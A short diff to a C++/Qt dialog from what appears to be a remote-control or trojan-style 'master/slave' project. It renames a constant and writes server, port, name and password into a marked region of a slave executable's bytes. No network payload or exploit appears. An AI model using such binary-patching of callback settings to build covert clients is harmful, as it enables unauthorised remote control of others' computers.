@@ -1,6 +1,6 @@
 #include "EditSlaveDialog.hpp"
 
-#include <slave/inhibiter/ClientConfig.hpp>
+#include <Innocence.hpp>
 #include <QFileDialog>
 #include <QMessageBox>
 #include <common/Log.hpp>
@@ -84,12 +84,12 @@ namespace Master
 
         string buffer = new_server + SEPERATOR + new_port + SEPERATOR + new_client_name + SEPERATOR + new_password + MARKER;
         
-        if(buffer.size() >= Blaspheme::DEFAULT_STR_SIZE - MARKER_SIZE)
+		if(buffer.size() >= Innocence::CONNECTION_INFO_SIZE - MARKER_SIZE)
         {
             QMessageBox::critical(this, windowTitle(),tr("Les informations que vous avez entrées sont trop longues."));
         }
         
-        for(size_t index = begin_info ; index != begin_info + Blaspheme::DEFAULT_STR_SIZE - MARKER_SIZE ; index++)
+        for(size_t index = begin_info ; index != begin_info + Innocence::CONNECTION_INFO_SIZE - MARKER_SIZE ; index++)
         {
             content_exe[index] = '\0';
         }
